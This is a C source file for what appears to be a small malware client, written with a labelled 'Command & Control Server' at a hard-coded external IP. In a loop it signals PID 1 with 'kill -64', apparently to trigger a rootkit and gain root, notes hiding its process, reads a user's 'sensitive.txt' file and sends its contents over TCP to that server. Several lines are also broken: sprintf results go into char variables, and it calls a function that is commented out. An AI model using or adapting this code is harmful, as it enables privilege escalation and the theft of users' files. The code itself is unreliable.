#include <stdlib.h>
#include <stdio.h>
#include <dirent.h> 
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#define PORT 1030

/*static void test_connection(void)
{
	char cmd[] = "curl -I https://stackoverflow.com/";
    system(cmd);
}*/

/* 
Establish stream TCP socket connection with Command & Control Server 
Source: https://www.geeksforgeeks.org/socket-programming-cc/
*/
int send_server(char *message)
{
   int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    char buffer[1024] = { 0 };
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
 
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
 
    // Convert IPv4 and IPv6 addresses from text to binary
    if (inet_pton(AF_INET, "47.88.90.66", &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
 
    if ((client_fd
         = connect(sock, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    send(sock, message, strlen(message), 0);
    printf("Data sent\n");
    valread = read(sock, buffer, 1024);
    printf("%s\n", buffer);
 
    // Close established socket
    close(client_fd);
    return 0;
}

int get_root(void)
{
    system("kill -64 1");
    
    // prove that root was gained
    //system("whoami > /home/debian/test.txt");

    // get pid to hide process
    int pid = getpid();
    //printf("pid is %d\n", pid);

    return 0;
}

/* Get sensitive file data */
int get_file_data() {

    // read file data into variable with absolute path    
    char file_path = sprintf("/home/%s/Documents/sensitive.txt", getenv("USERPROFILE"));
    FILE* ptr = fopen(file_path, "r");
    if (ptr == NULL) {
        printf("no such file.");
        return 0;
    }
 
    /* Assuming that test.txt has content
       in below format
    NAME AGE CITY
    abc     12 hyderbad
    bef     25 delhi
    cce     65 bangalore */
    char buf[100];
    while (fscanf(ptr, "%*s %*s %s ", buf) == 1)
    {
        char message = sprintf("%s", buf);
        send_server(message);
    }

    return 0;
}

int main(int argc, char *argv[]) 
{

    while(1)
    {
        sleep(10);
        test_connection();
        get_root();
        get_file_data();
    }

    return 0;
}